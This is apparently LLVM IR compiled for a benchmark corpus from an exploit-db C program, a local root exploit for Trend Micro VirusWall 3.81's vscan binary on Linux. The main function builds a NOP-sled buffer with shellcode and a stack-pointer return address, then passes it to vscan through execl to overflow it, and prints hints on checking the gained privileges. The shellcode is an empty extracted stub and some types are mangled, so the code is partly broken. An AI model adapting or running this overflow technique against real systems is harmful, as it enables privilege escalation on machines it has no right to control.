; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_3213.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_3213.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [76 x i8] c"\0ALocal root exploit for vscan/VSAPI (=Trend Micro VirusWall 3.81 on Linux)\0A\00", align 1
@.str.1 = private unnamed_addr constant [58 x i8] c"Author: Sebastian Wolfgarten, <sebastian@wolfgarten.com>\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"Date: January 3rd, 2007\0A\0A\00", align 1
@vscan = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [68 x i8] c"Okay, %s is executable and by the way, your current user id is %d.\0A\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"Error allocating memory!\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [73 x i8] c"\0AExecuting %s. Afterwards check your privilege level with id or whoami!\0A\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"vscan\00", align 1
@.str.7 = private unnamed_addr constant [78 x i8] c"Exploit failed. You seem not to have enough privileges to execute %s, sorry.\0A\00", align 1
@.str.8 = private unnamed_addr constant [114 x i8] c"Hint: Ask your local admin to add yourself to the iscan group or let him make the vscan binary world-executable.\0A\00", align 1
@.str.9 = private unnamed_addr constant [21 x i8] c"Then try again :-)\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  store i32 1120, i32* %8, align 4
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.1, i64 0, i64 0))
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  %14 = load i8*, i8** @vscan, align 8
  %15 = call i32 @access(i8* %14, i32 1)
  %16 = icmp ne i32 %15, -1
  br i1 %16, label %17, label %61

17:                                               ; preds = %3
  %18 = load i8*, i8** @vscan, align 8
  %19 = call i32 (...) @getuid()
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.3, i64 0, i64 0), i8* %18, i32 %19)
  %21 = load i32, i32* %8, align 4
  %22 = call i64 @malloc(i32 %21)
  %23 = inttoptr i64 %22 to i8*
  store i8* %23, i8** %10, align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %25, label %28

25:                                               ; preds = %17
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0))
  %27 = call i32 @exit(i32 -1) #3
  unreachable

28:                                               ; preds = %17
  %29 = call i64 (...) @get_sp()
  store i64 %29, i64* %9, align 8
  %30 = load i8*, i8** %10, align 8
  %31 = load i32, i32* @NOP, align 4
  %32 = load i32, i32* %8, align 4
  %33 = call i32 @memset(i8* %30, i32 %31, i32 %32)
  %34 = load i8*, i8** %10, align 8
  %35 = load i32, i32* %8, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i32, i32* @shellcode, align 4
  %39 = call i8* @strlen(i32 %38)
  %40 = ptrtoint i8* %37 to i64
  %41 = ptrtoint i8* %39 to i64
  %42 = sub i64 %40, %41
  %43 = sub nsw i64 %42, 8
  %44 = trunc i64 %43 to i32
  %45 = load i32, i32* @shellcode, align 4
  %46 = load i32, i32* @shellcode, align 4
  %47 = call i8* @strlen(i32 %46)
  %48 = call i32 @memcpy(i32 %44, i32 %45, i8* %47)
  %49 = load i64, i64* %9, align 8
  %50 = load i8*, i8** %10, align 8
  %51 = load i32, i32* %8, align 4
  %52 = sub nsw i32 %51, 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = bitcast i8* %54 to i64*
  store i64 %49, i64* %55, align 8
  %56 = load i8*, i8** @vscan, align 8
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i64 0, i64 0), i8* %56)
  %58 = load i8*, i8** @vscan, align 8
  %59 = load i8*, i8** %10, align 8
  %60 = call i32 @execl(i8* %58, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* %59, i32* null)
  br label %67

61:                                               ; preds = %3
  %62 = load i8*, i8** @vscan, align 8
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.7, i64 0, i64 0), i8* %62)
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([114 x i8], [114 x i8]* @.str.8, i64 0, i64 0))
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0))
  %66 = call i32 @exit(i32 1) #3
  unreachable

67:                                               ; preds = %28
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @access(i8*, i32) #1

declare dso_local i32 @getuid(...) #1

declare dso_local i64 @malloc(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @get_sp(...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i32, i32, i8*) #1

declare dso_local i8* @strlen(i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
